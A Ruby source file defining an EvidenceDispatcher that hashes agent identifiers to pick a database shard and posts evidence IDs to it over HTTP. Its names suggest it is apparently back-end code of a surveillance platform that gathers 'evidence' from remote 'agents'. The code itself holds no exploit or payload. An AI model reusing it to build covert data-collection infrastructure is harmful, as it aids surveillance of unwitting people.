require 'rcs-common/trace'
require 'eventmachine'
require 'zlib'

require 'http/parser'
require 'em-http-request'

require_relative 'shard'

module RCS
module DB

class EvidenceDispatcher
  include Singleton
  include RCS::Tracer
  include EventMachine::Protocols
    
  def initialize
    @shards = Hash.new
    
    # for each known shard, prepare a list of notification
    Shard.all['shards'].each do |shard|
      ip, port = shard['host'].split(':')
      @shards[shard['_id']] = {host: ip, port: port}
    end
    
    # worker polling thread, check for health status
  end
  
  def shard_id(ident, instance)
    hash_string = "#{ident}:#{instance}"
    idx = Zlib::crc32(hash_string) % Shard.count
    @shards.keys[idx]
  end
  
  def notify_new_shard
    
  end
  
  def notify(evidence_id, shard_id, ident, instance)
    
    #trace :debug, "Notifying evidences #{evidence_id} to #{shard_id}"
    
    agent = ::Item.agents.where({ident: ident, instance: instance}).first
    return false if agent.nil?
    
    # spread evidences to shards, each shard getting ALL the evidences for the same agent (round-robin)
    #identify the correct shard for the evidence

    # send the queue to the correct shard
    http = EM::HttpRequest.new("http://#{@shards[shard_id][:host]}:5150/").post :body => {ids: [{instance: instance, ident: ident, id: evidence_id}]}.to_json
    http.callback do
      trace :debug, "Notified evidence #{evidence_id} for agent #{agent[:name]} to worker #{@shards[shard_id][:host]}."
    end
    http.errback do
      trace :error, "Cannot notify evidence #{evidence_id} for to shard #{@shards[shard_id][:host]}. Will retry."
    end
    
    return true
  end
  
end # EvidenceDispatcher

end # ::DB
end # ::RCS
